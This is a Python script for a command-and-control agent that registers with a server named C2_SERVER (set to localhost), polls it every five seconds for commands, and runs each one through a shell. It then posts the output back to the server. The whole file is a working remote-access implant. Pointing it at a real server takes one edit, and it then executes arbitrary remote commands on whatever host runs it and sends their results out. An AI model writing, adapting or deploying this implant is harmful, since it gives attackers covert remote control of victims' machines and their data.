import requests
import time
import os
import logging
import subprocess

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

AGENT_ID = "agent_001"
C2_SERVER = "http://127.0.0.1:5000"

def register_agent():
    response = requests.post(f"{C2_SERVER}/register", json={"agent_id": AGENT_ID})
    logging.info(response.json())

def poll_for_commands():
    response = requests.get(f"{C2_SERVER}/poll/{AGENT_ID}")
    commands = response.json().get('commands', [])
    return commands

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
        logging.info(f'Executed command: {command}')
        return output.decode()
    except subprocess.TimeoutExpired:
        logging.error(f'Timeout executing command: {command}')
        return "Command timed out."
    except Exception as e:
        logging.error(f'Error executing command: {command}, Error: {str(e)}')
        return str(e)

def report_output(command_id, output, status='success'):
    response = requests.post(f"{C2_SERVER}/report", json={"command_id": command_id, "output": output, "status": status})
    logging.info(response.json())

def main():
    register_agent()
    while True:
        commands = poll_for_commands()
        for cmd in commands:
            command_id = cmd['id']
            command = cmd['command']
            output = execute_command(command)
            report_output(command_id, output)
        time.sleep(5)  # Poll every 5 seconds

if __name__ == "__main__":
    main()
